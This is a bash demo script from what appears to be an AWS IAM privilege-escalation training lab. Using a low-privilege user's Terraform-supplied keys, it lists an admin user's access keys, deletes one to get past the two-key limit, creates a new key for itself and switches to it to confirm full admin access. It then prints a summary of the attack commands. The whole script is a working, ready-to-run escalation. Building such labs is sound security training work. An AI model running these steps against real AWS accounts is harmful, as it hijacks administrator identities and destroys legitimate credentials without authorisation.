#!/bin/bash

# Demo script for iam:DeleteAccessKey + iam:CreateAccessKey privilege escalation
# This scenario demonstrates how a user with iam:DeleteAccessKey and iam:CreateAccessKey
# can bypass the 2-key limit by deleting an existing key and creating a new one for an admin user.


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-iam-003-to-admin-starting-user"
ADMIN_USER="pl-prod-iam-003-to-admin-target-user"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM DeleteAccessKey + CreateAccessKey Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_iam_003_iam_deleteaccesskey_createaccesskey.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
export AWS_REGION=$AWS_REGION
unset AWS_SESSION_TOKEN

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 5: List existing access keys for the admin user
echo -e "${YELLOW}Step 5: Listing existing access keys for admin user${NC}"
echo "Target admin user: $ADMIN_USER"
echo "Using iam:ListAccessKeys to enumerate existing credentials..."

show_cmd "Attacker" "aws iam list-access-keys --user-name $ADMIN_USER --output json"
EXISTING_KEYS=$(aws iam list-access-keys --user-name $ADMIN_USER --output json)
KEY_COUNT=$(echo "$EXISTING_KEYS" | jq '.AccessKeyMetadata | length')

echo "Existing access keys for $ADMIN_USER:"
echo "$EXISTING_KEYS" | jq -r '.AccessKeyMetadata[] | "  - \(.AccessKeyId) (Created: \(.CreateDate), Status: \(.Status))"'

if [ "$KEY_COUNT" -lt 2 ]; then
    echo -e "${YELLOW}⚠ Warning: User has less than 2 keys. This scenario demonstrates bypassing the 2-key limit.${NC}"
fi

echo -e "${GREEN}✓ Found $KEY_COUNT existing access key(s)${NC}\n"

# Step 6: Delete one of the existing access keys
echo -e "${YELLOW}Step 6: Deleting one of the existing access keys${NC}"
echo "To create a new key, we must first delete one of the existing keys (AWS 2-key limit)..."

# Get the first key ID to delete
KEY_TO_DELETE=$(echo "$EXISTING_KEYS" | jq -r '.AccessKeyMetadata[0].AccessKeyId')

if [ -z "$KEY_TO_DELETE" ] || [ "$KEY_TO_DELETE" == "null" ]; then
    echo -e "${RED}Error: No existing keys found to delete${NC}"
    exit 1
fi

# Save the deleted key info to a file for cleanup restoration
echo "$KEY_TO_DELETE" > /tmp/deleted_key_info.txt

echo "Deleting access key: $KEY_TO_DELETE"
show_attack_cmd "Attacker" "aws iam delete-access-key --user-name $ADMIN_USER --access-key-id $KEY_TO_DELETE"
aws iam delete-access-key \
    --user-name $ADMIN_USER \
    --access-key-id $KEY_TO_DELETE

echo -e "${GREEN}✓ Successfully deleted access key: $KEY_TO_DELETE${NC}"
echo -e "${YELLOW}Note: Deleted key ID saved for cleanup restoration${NC}\n"

# Step 7: Create a new access key for the admin user
echo -e "${YELLOW}Step 7: Creating new access key for admin user${NC}"
echo "Using iam:CreateAccessKey permission to create new credentials..."

show_attack_cmd "Attacker" "aws iam create-access-key --user-name $ADMIN_USER --output json"
KEY_OUTPUT=$(aws iam create-access-key --user-name $ADMIN_USER --output json)
NEW_ACCESS_KEY=$(echo $KEY_OUTPUT | jq -r '.AccessKey.AccessKeyId')
NEW_SECRET_KEY=$(echo $KEY_OUTPUT | jq -r '.AccessKey.SecretAccessKey')

echo "Created access key: $NEW_ACCESS_KEY"
echo -e "${GREEN}✓ Successfully created access keys${NC}\n"

# Wait for keys to initialize
echo -e "${YELLOW}Waiting 15 seconds for keys to initialize...${NC}"
sleep 15
echo -e "${GREEN}✓ Keys initialized${NC}\n"

# Step 8: Switch to admin user credentials
echo -e "${YELLOW}Step 8: Switching to admin user credentials${NC}"
unset AWS_SESSION_TOKEN
export AWS_ACCESS_KEY_ID=$NEW_ACCESS_KEY
export AWS_SECRET_ACCESS_KEY=$NEW_SECRET_KEY
# Keep region consistent
export AWS_REGION=$AWS_REGION

# Verify new identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
ADMIN_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "New identity: $ADMIN_IDENTITY"

if [[ ! $ADMIN_IDENTITY == *"$ADMIN_USER"* ]]; then
    echo -e "${RED}Error: Failed to switch to admin user${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Now using admin credentials${NC}\n"

# Step 9: Verify administrator access
echo -e "${YELLOW}Step 9: Verifying administrator access${NC}"
echo "Attempting to list IAM users..."

show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    exit 1
fi
echo ""

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (limited permissions)"
echo "2. Listed existing access keys for: $ADMIN_USER (found $KEY_COUNT keys)"
echo "3. Deleted existing access key: $KEY_TO_DELETE"
echo "4. Created new access key: $NEW_ACCESS_KEY"
echo "5. Switched to new admin credentials"
echo "6. Achieved: Full administrator access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER → (iam:ListAccessKeys) → list keys"
echo "  → (iam:DeleteAccessKey) → delete key: $KEY_TO_DELETE"
echo "  → (iam:CreateAccessKey) → create key: $NEW_ACCESS_KEY"
echo "  → $ADMIN_USER → Admin Access"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Deleted access key: $KEY_TO_DELETE"
echo "- New access key created: $NEW_ACCESS_KEY"
echo "- Key info stored in: /tmp/deleted_key_info.txt"

echo -e "\n${RED}⚠ Warning: The new access key remains active and the deleted key is gone${NC}"
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
